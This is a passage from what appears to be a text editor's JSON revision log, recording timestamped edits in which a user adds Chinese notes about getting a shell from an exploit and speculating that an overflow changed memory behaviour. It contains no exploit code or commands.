2607]]],[1580910299539,["whale@Whale",[[1,2597,"的exp"]],[2597,2597],[2601,2601]]],[1580910361572,[null,[[-1,1072," "],[1,1073,"\nc"],[-1,1082,"n"]],[1072,1072],[1082,1082]]],[1580910361572,[null,[[1,1072," "],[-1,1072,"\nc"],[1,1083,"n"]],[1082,1082],[1072,1072]]],[1580910303088,["whale@Whale",[[1,2590,"za"]],[2590,2590],[2592,2592]]],[1580910303651,["whale@Whale",[[-1,2590,"za"]],[2592,2592],[2590,2590]]],[1580910315911,["whale@Whale",[[1,2590,"在成功弹shell一次后，"]],[2590,2590],[2603,2603]]],[1580910318623,["whale@Whale",[[1,2624,"\n"]],[2624,2624],[2625,2625]]],[1580910319007,["whale@Whale",[[1,2625,"\n"]],[2625,2625],[2626,2626]]],[1580910330856,["whale@Whale",[[1,2636,"就能成功谈"]],[2636,2636],[2641,2641]]],[1580910331509,["whale@Whale",[[-1,2640,"谈"]],[2641,2641],[2640,2640]]],[1580910334558,["whale@Whale",[[1,2640,"弹shell。"]],[2640,2640],[2647,2647]]],[1580910335367,["whale@Whale",[[1,2647,"\n\n"]],[2647,2647],[2648,2648]]],[1580910335991,["whale@Whale",[[1,2649,"\n"]],[2648,2648],[2649,2649]]],[1580910356727,["whale@Whale",[[-1,2649,"\n"],[1,2650,"推测是因为溢出改变了某个内存机制？zhi"]],[2649,2649],[2669,2669]]],[1580910357338,["whale@Whale",[[-1,2666,"zhi"]],[2669,2669],[2666,2666]]],[1580910360171,["whale@Whale",[[1,2666,"知识的"]],[2666,2666],[2669,2669]]],[1580910384096,[null,[[-1,1072," "],[1,1073,"\nc"],[-1,1082,"n"]],[1072,1072],[1082,1082]]],[1580910384096,[null,[[1,1072," "],[-1,1072,"\nc"],[1,1083,"n"]],[1082,1082],[1072,1072]]],[1580910366668,["whale@Whale",[[1,2669,"匮乏导致无法继续分析。"]],[2669,2669],[2680,2680]]]]]]}